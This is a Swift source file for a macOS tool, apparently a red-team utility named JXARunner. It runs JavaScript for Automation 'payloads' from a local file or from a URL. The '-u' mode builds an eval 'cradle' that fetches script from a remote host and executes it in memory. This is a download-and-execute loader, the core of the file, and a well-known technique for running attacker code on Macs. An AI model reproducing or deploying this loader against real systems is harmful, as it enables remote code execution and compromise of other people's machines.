import Foundation
import Cocoa
import OSAKit

//Usage:
// for hosted .js JXA payloads: ./JXARunner -u [url_to_jxa_payload]
// for local .js JXA payloads: ./JXARunner -f [path_to_jxa_payload]

let scriptName = CommandLine.arguments[0]
let fileMan = FileManager.default


if CommandLine.arguments.count != 3{
    print("Usage: \(scriptName) [-f or -u] [file_path or jxa_payload_url_path]")
    print("Local File Example: \(scriptName) -f /tmp/file.js")
    print("URL Payload Example: \(scriptName) -u http://127.0.0.1/file.js")
    print("Exiting...")
    exit(0)
}
else {
    if CommandLine.arguments[1] == "-u" {
        let url = CommandLine.arguments[2]
        
        let execCradle = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('\(url)')),$.NSUTF8StringEncoding)));"

        let k = OSAScript.init(source: execCradle, language: OSALanguage.init(forName: "JavaScript"))
        var compileErr : NSDictionary?
        k.compileAndReturnError(&compileErr)
        var scriptErr : NSDictionary?
        k.executeAndReturnError(&scriptErr)
        
        sleep(2)
        print("[+] Executed the JXA payload hosted at \(url)")
        
    }
    else if CommandLine.arguments[1] == "-f"{
        var filePath = CommandLine.arguments[2]
        if fileMan.fileExists(atPath: filePath){
            filePath = CommandLine.arguments[2]

            let localExec = "eval(ObjC.unwrap($.NSString.stringWithContentsOfFile('\(filePath)')));"
            let data = try String(contentsOfFile: "\(filePath)")
            
            let k = OSAScript.init(source: data, language: OSALanguage.init(forName: "JavaScript"))
                var compileErr : NSDictionary?
                k.compileAndReturnError(&compileErr)
                var scriptErr : NSDictionary?
                k.executeAndReturnError(&scriptErr)
            
            sleep(2)
            print("[+] Executed the JXA payload hosted at \(filePath)")
        }
        else {
            print("[-] File \(filePath) not found. Exiting...")
            exit(0)
        }
        
    }
    else {
        print("Only -u or -f is accepted as the first switch. Exiting...")
        exit(0)
    }
}
